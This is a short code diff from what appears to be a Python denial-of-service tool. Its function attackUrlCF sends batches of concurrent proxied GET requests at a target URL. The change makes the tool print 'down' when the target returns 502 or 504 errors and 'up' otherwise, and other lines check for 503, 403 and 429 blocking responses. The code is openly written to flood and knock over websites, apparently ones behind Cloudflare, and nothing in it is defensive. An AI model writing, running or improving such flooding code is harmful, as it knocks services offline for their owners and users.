@@ -104,9 +104,14 @@ def attackUrlCF(baseUrl, threadNumber):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
+			isClear = True
 			for r in res:
-				if str(r.status_code) in ['502', '504']:
-					print('down!!!!!')
+				if str(r.status_code) in ['502', '504']:					
+					isClear = False
+			if isClear:
+				print('up.....')
+			else:
+				print('down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
